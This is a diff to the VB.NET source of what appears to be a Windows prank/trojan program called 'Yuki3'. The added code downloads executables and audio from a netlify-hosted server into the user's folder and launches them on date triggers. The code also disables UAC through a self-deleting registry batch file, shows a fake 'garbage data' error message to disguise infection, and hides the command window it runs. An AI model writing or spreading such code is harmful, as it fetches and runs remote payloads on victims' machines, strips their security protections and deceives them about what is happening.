@@ -73,7 +73,12 @@ Public Class Form1
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/earrape.wav
         'my_thing_idkvb.Show()
         If testing = True Then
+            Try
+                My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\BreakingBad.wav", AudioPlayMode.Background)
+            Catch ex As Exception
 
+            End Try
+            Walter_White.Show()
         Else
             'MsgBox(Application.StartupPath)
             If Not My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
@@ -146,8 +151,8 @@ Public Class Form1
 
             If disableUAC = True Then
                 Dim sb3 As New System.Text.StringBuilder
-                sb3.AppendLine("C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
-                sb3.AppendLine("exit")
+                sb3.AppendLine("cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
+                '  sb3.AppendLine("exit")
                 sb3.AppendLine("del fuckUAC.cmd")
                 IO.File.WriteAllText("fuckUAC.cmd", sb3.ToString())
                 Process.Start("fuckUAC.cmd")
@@ -209,6 +214,17 @@ Public Class Form1
             Try
                 download15 = True
                 My.Computer.Network.DownloadFile(
+            WebserverURL & "/chilledwindows.exe", 'https://incomparable-cascaron-802b94.netlify.app/chilledwindows.exe
+            "C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe")
+
+            Catch ex As Exception
+
+            End Try
+
+
+            Try
+                download15 = True
+                My.Computer.Network.DownloadFile(
             WebserverURL & "/Yuki3Antivirus.exe", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
             "C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")
 
@@ -224,7 +240,7 @@ Public Class Form1
             Catch ex As Exception
 
             End Try
-
+            'Show()
             Try
                 download17 = True
                 My.Computer.Network.DownloadFile(
@@ -264,7 +280,7 @@ Public Class Form1
             Catch ex As Exception
 
             End Try
-
+            'BreakingBad.wav
             Try
                 download9 = True
                 My.Computer.Network.DownloadFile(
@@ -275,6 +291,15 @@ Public Class Form1
 
             End Try
 
+            Try
+
+                My.Computer.Network.DownloadFile(
+             WebserverURL & "/BreakingBad.wav", 'https://incomparable-cascaron-802b94.netlify.app/BreakingBad.wav
+            "C:\Users\" & SystemInformation.UserName & "\BreakingBad.wav")
+
+            Catch ex As Exception
+
+            End Try
 
             Try
                 download9 = True
@@ -473,7 +498,7 @@ Public Class Form1
                     End If
                     If day = 1 AndAlso month = 2 Then
                         Try
-                            Process.Start("C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
+                            Process.Start("C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe") '"C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe"
                         Catch ex As Exception
                             MsgBox(ex.ToString, 0 + 16, "ERROR")
                         End Try
@@ -485,8 +510,24 @@ Public Class Form1
                     If day = 1 AndAlso month = 3 Then
                         ur_pc_is_gone_lmao.Show()
                     End If
-                    If day = 9 AndAlso month = 7 Then
+                    If day = 9 AndAlso month = 7 Then ' "C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe"
                         my_thing_idkvb.Show()
+                    End If
+                    If day = 5 AndAlso month = 10 Then ' "C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe"
+                        Process.Start("C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe")
+                    End If
+                    ' "C:\Users\" & SystemInformation.UserName & "\BreakingBad.wav"
+                    If day = 9 AndAlso month = 7 Then ' "C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe"
+                        my_thing_idkvb.Show()
+                    End If
+                    If day = 20 AndAlso month = 1 Then ' "C:\Users\" & SystemInformation.UserName & "\chilledwindows.exe"
+                        Try
+                            My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\BreakingBad.wav", AudioPlayMode.Background)
+                        Catch ex As Exception
+
+                        End Try
+                        Walter_White.Show()
+
                     End If
                     If day = 17 AndAlso month = 6 Then
                         Try
@@ -883,7 +924,8 @@ Public Class Form1
             Else
                 If admin = True Then
                     'MsgBox("This program is incompatible with your current Windows installation.", 0 + 16, "incompatible")
-                    Yuki___infected.Show()
+                    '  Yuki___infected.Show()
+                    MsgBox("Unable to decompress ""IndexedDbLegacy.dll"" File contains garbage data at 0x92873 aborting.", 0 + 16, "yuki3")
                     Dim file2 As System.IO.StreamWriter
                     file2 = My.Computer.FileSystem.OpenTextFileWriter("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki", True)
                     file2.WriteLine("true")
@@ -1866,7 +1908,7 @@ Public Class MyUtilities
         pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
         pi.FileName = "cmd.exe"
         p.StartInfo = pi
-        ' p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
         p.Start()
     End Sub
 
